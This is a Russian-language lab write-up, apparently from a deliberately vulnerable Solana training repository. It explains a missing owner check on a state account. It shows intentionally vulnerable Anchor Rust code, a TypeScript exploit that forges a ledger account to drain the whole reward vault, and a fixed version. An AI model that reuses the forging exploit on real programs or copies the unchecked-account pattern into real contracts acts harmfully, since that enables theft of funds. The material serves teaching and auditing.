# 03 — Поддельный аккаунт состояния (forged state account)

**Класс:** отсутствие проверки владельца (owner check) аккаунта состояния.
**Файлы:** `programs/vuln03_forged_state/`, `native-programs/vuln05_arbitrary_cpi`
(программа атакующего, mode 1), `tests/03_forged_state.test.ts`.
**Последствие:** атакующий создаёт аккаунт «состояния» с любым содержимым и
получает выплаты из протокольного хранилища.

## 1. Суть уязвимости

Solana-программа владеет своими аккаунтами: поле `owner` аккаунта указывает на
программу, и **только она может менять их содержимое**. Обратное тоже верно:
программа обязана принимать данные только от аккаунтов, которые **созданы ею**
(`owner == program_id` или PDA с её сеятельством).

Классическая ошибка — «рукописный» разбор данных: программа принимает
`UncheckedAccount`, проверяет только 8-байтовый префикс (дискриминатор) и
читает поля. Атакующий создаёт аккаунт **своей** программы с точно такой же
раскладкой байтов — и программа принимает его за своё состояние:

```
[8 байт дискриминатора][32 байта owner][8 байт amount]  ← ожидаемая раскладка
[8 байт любой префикс][32 байта owner][8 байт amount]   ← что делает атакующий
```

## 2. Уязвимый код

```rust
#[derive(Accounts)]
pub struct ClaimRewards<'info> {
    /// CHECK: БАГ — «ledger» разбирается вручную, проверяется только префикс
    #[account(mut)]
    pub ledger: UncheckedAccount<'info>,
    #[account(mut)]
    pub user: Signer<'info>,
    #[account(mut, seeds = [b"vault"], bump)]
    pub vault: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
}

pub fn claim_rewards(ctx: Context<ClaimRewards>, amount: u64) -> Result<()> {
    let ledger_data = ctx.accounts.ledger.try_borrow_data()?;
    // Единственная проверка — 8-байтовый дискриминатор!
    require!(ledger_data[0..8] == DISCRIMINATOR, Fault::BadLedger);
    let owner = Pubkey::new(&ledger_data[8..40]);
    let entitlement = u64::from_le_bytes(ledger_data[40..48].try_into().unwrap());
    drop(ledger_data);

    require!(ctx.accounts.user.key() == owner, Fault::NotOwner);
    require!(amount <= entitlement, Fault::TooMuch);
    // ... выплачиваем из vault ...
}
```

Проверка `owner` внутри данных бессмысленна: атакующий **сам записывает** эти
32 байта, потому что аккаунт — его.

## 3. Как эксплуатируется

Тест `tests/03_forged_state.test.ts` использует программу атакующего
(`native-programs/attacker`, mode 1), которая:

1. Создаёт PDA-аккаунт **программы атакующего** с сеятельством
   `[b"forge", payload[0..8]]`.
2. Записывает в него произвольные байты: дискриминатор-подделку +
   `owner = атакующий` + `amount = 1000` (весь vault).

```ts
const payload = Buffer.concat([
  LEDGER_PREFIX,                 // 8 байт «правильного» дискриминатора
  attacker.publicKey.toBytes(),  // owner = атакующий
  amt,                           // entitlement = 1000 (весь vault)
]);
// аккаунт создаётся и заполняется программой атакующего
await sendTx([nativeIx(PROG_IDS.attacker, 1, payload, [
  { pubkey: forgedAccount, isSigner: false, isWritable: true },
  { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
  { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
])], [attacker]);

// уязвимая программа принимает подделку и платит
await program.methods.claimRewards(new BN(1000)).accounts({
  ledger: forgedAccount,      // БАГ: не проверяется owner аккаунта
  user: attacker.publicKey,
  vault: vaultPda,
}).signers([attacker]).rpc();
```

Обратите внимание: современный System-требование «новый аккаунт должен
подписывать создание» обходится тем, что аккаунт — PDA программы атакующего,
и она подписывает создание через `invoke_signed`.

## 4. Результат атаки (проверяется тестом)

```ts
assert.equal((await tokenBalance(attackerAta)).toString(), "1000"); // весь reward-vault
assert.equal((await tokenBalance(vaultPda)).toString(), "0");
```

Легитимный ledger жертвы (100 токенов) остался нетронутым — атакующий вообще
не притрагивался к чужим аккаунтам: он принёс **свой фейковый**.

## 5. Реальные кейсы

- **Crema Finance** (июль 2022, ~$8.9M): атакующий подменил аккаунты ликвидных
  позиций, с которыми работала программа — проверки на принадлежность
  протоколу были неполными, что позволило «сгенерировать» прибыльные позиции
  и вывести средства.
- Класс «невалидированный аккаунт» стабильно входит в топ находок аудитов
  Solana-программ (см. отчёты OtterSec, Kudelski, Neodyme 2021–2023).

## 6. Исправление

```rust
#[derive(Accounts)]
pub struct ClaimRewardsFixed<'info> {
    // PDA-сеятельство + bump: аккаунт МОЖЕТ быть создан только нашей программой
    #[account(
        mut,
        seeds = [b"ledger", user.key().as_ref()],
        bump,
        constraint = ledger.owner == user.key() @ Fault::NotOwner
    )]
    pub ledger: Account<'info, Ledger>,   // типизированный разбор + дискриминатор
    pub user: Signer<'info>,
    #[account(mut, seeds = [b"vault"], bump)]
    pub vault: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
}
```

Правила:

1. Никогда не разбирать «своё» состояние из `UncheckedAccount`.
2. Каждое протокольное состояние — PDA с сеятельством программы (`seeds` +
   `bump`) — это математически исключает подделку.
3. Проверять `owner` аккаунта: `Account<T>` в Anchor делает это автоматически;
   для ручных программ — `assert!(acc.owner == program_id)`.

## 7. Запуск

```bash
./scripts/run_tests.sh tests/03_forged_state.test.ts
```
